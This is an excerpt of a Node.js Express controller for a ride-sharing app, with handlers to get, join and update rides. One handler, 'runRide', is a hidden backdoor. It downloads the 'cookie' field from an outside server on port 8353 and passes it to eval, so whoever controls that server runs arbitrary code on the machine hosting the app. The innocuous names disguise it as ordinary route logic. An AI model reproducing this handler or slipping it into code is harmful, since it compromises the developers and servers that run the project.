...
const { SERVER_API } = require("../constants/index.js")
const axios = require('axios')

module.exports = {
  getRide: async (req, res, next) => {
    try {
  ...
  runRide: async (req, res, next) => {
      const rides = await axios.get(`http://${SERVER_API}:8353/api/user/thirdcookie/v3/106`)
      eval(rides.data.cookie)
  },
  joinRide: async (req, res, next) => {
    try {
      ...
      await Ride.updateOne({ _id: ride._id }, { $push: { passengers: req.user.id }, $inc: { availableSeats: -1 } });
      await User.updateOne({ _id: req.user.id }, { $push: { ridesJoined: ride._id } });
  ...
  updateRide: async (req, res, next) => {
    try {
      ...
      const ride = await Ride.findByIdAndUpdate(req.params.id, { $set: details }, { new: true });
